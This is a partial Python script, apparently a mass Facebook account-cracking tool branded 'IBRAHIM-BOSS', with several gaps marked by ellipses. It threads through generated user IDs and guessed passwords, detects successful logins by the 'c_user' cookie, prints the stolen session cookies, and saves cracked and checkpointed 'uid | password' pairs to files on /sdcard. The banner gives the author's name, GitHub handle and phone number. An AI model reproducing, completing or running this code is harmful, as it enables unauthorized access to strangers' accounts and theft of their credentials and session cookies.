...
••••••••••••••••••••••••••••••••••••••••••••••••••\033[35;1m
[-] AUTHOR    :\033[35;1 IBRAHIM VAU
\033[1;33m[-] GITHUB    :\033[1;33m IBR4HIM-404
\033[32;1m[-] WhatsApp  :\033[32;1m 01706407752
...
def linex():
	print('\x1b[1;91m●\x1b[1;92m═━═━═━═━═━━═━═━═\x1b[1;91m❴\033[47m\033[1;46mIBRAHIM-BOSS\033[40m\033[00m\x1b[1;91m❵\x1b[1;92m═━═━═━━═━═━═━═\x1b[1;91m●')
loop = 0
oks = []
cps = []
...
def xxr():
    ...
    with ThreadPool(max_workers=50) as manshera:
        ...
        print(f' \033[34;1m[\033[34;1m•\033[34;1m]\033[34;1m TOOL OWNER \033[1;97m: \033[34;1m IBRAHIM-BOSS')
        ...
        print(f" \x1b[1;91m●\x1b[1;92m═━═━═━═━═━━═━═━═\x1b[1;91m❴\033[47m\033[1;46mIBRAHIM-BOSS\033[40m\033[00m\x1b[1;91m❵\x1b[1;92m═━═━═━━═━═━═━═\x1b[1;91m●")
        for love in user:
            pwx = [love[1:]]
            uid = code+love
            for Eman in HamiiID:
        ...
        for ps in pwx:
           ...
           'viewport-width': '980',
            ...
            if 'c_user' in log_cookies:
                ...
                cid = coki[7:22]
                print('\r\r\033[1;32m [IBRAHIM-BOSS-OK💉] ' +cid+ ' | ' +ps+    '  \n \033[1;33mCookie 🍪= \033[1;32m'+coki+  '  ''  \033[0;97m')
                cek_apk(session,coki)
                open('/sdcard/IBRAHIM-BOSS-OK.txt', 'a').write( uid+' | '+ps+'\n')
                oks.append(cid)
                break
                ...
                open('/sdcard/IBRAHIM-BOSS-CP.txt', 'a').write( uid+' | '+ps+' \n')
                cps.append(cid)
                break
            else:
                continue
        loop+=1
        sys.stdout.write(f'\r\r%s {x}[{xr}IBRAHIM-BOSS-99 {x}][%s|%s][OK:{xr}%s{x}]'%(H,loop,tl,len(oks))),
        sys.stdout.flush()
    except:
        pass
